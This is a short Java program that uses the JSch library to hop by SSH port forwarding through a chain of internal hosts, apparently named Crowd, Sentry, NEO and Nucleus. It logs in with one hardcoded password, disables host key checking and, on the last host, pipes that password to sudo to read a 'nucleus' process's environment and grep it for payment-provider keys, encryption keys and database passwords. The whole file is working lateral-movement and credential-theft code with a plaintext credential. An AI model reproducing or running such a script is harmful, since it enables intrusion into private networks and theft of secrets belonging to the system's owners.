import com.jcraft.jsch.*;
import java.io.*;
class XSK {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    // Hop: Crowd -> Internaltools -> Sentry -> NEO -> Nucleus
    Session s1 = j.getSession("user", "10.14.36.23", 22);
    s1.setPassword("kutul0nc4t");
    s1.setConfig(p);
    s1.setTimeout(10000);
    s1.connect();
    // Forward to Sentry
    int fwd1 = s1.setPortForwardingL(0, "10.13.16.117", 22);
    Session s2 = j.getSession("user", "127.0.0.1", fwd1);
    s2.setPassword("kutul0nc4t");
    s2.setConfig(p);
    s2.setTimeout(8000);
    s2.connect();
    // Forward to NEO
    int fwd2 = s2.setPortForwardingL(0, "10.13.16.196", 22);
    Session s3 = j.getSession("user", "127.0.0.1", fwd2);
    s3.setPassword("kutul0nc4t");
    s3.setConfig(p);
    s3.setTimeout(8000);
    s3.connect();
    // Forward to Nucleus
    int fwd3 = s3.setPortForwardingL(0, "10.13.16.135", 22);
    try {
      Session s4 = j.getSession("user", "127.0.0.1", fwd3);
      s4.setPassword("kutul0nc4t");
      s4.setConfig(p);
      s4.setTimeout(8000);
      s4.connect();
      ChannelExec ch = (ChannelExec) s4.openChannel("exec");
      ch.setCommand("hostname;id;echo ---JVM---;ps aux | grep java | grep -v grep | head -2;echo ---ENV---;echo kutul0nc4t | sudo -S cat /proc/$(pgrep -f nucleus | head -1)/environ 2>/dev/null | tr '\\0' '\\n' | grep -iE 'xnd_\\|xendit\\|NUC_ENC\\|ENC_\\|db\\.pass\\|PASS'");
      ch.setInputStream(null);
      InputStream in = ch.getInputStream();
      ch.connect();
      byte[] buf = new byte[16384];
      int i;
      while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
      ch.disconnect();
      s4.disconnect();
    } catch (Exception e) {
      System.out.println("NUCLEUS_FAIL: " + e.getMessage());
    }
    s3.disconnect();
    s2.disconnect();
    s1.disconnect();
  }
}
